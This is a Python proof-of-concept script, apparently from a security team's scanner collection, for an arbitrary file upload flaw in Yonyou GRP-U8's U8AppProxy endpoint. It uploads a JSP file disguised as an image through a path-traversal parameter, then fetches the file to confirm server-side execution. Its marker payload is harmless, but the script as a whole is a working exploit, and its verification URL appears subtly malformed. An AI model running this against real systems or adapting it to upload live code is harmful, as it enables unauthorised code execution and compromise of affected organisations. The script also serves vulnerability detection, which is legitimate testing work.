'''
Function:
    用友GRP-U8 U8AppProxy任意文件上传漏洞
Author:
    spmonkey，夜梓月
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
            "Cookie": "JSESSIONID=635F2271089E7A7E66F3F84824553DEE",
            "Accept-Encoding": "gzip"
        }
        self.proxies = proxies
        self.result_text = ""

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return scheme, netloc

    def vuln(self, netloc, scheme):
        url = "{}://{}/U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../yongyouU8_test".format(scheme, netloc)
        data = {
        'file': ('1.jsp', '<% out.println("yongyouu8");%>', 'image/jpeg'),
    }
        try:
            result = requests.post(url=url, files=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
            req = requests.get(url + "/yongyouU8_test.jsp", headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
            if req.text.find("yongyouu8") != -1:
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件上传漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                for request_type, request_text in dict(result.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                self.result_text += "\n"
                bodys = result.request.body.decode().split("\r\n")
                for body in bodys:
                    self.result_text += "\n                 {}".format(body)
                return True
            else:
                return False
        except:
            return False

    def main(self):
        all = self.host()
        scheme = all[0]
        netloc = all[1]
        if self.vuln(netloc, scheme):
             return self.result_text
        else:
            return False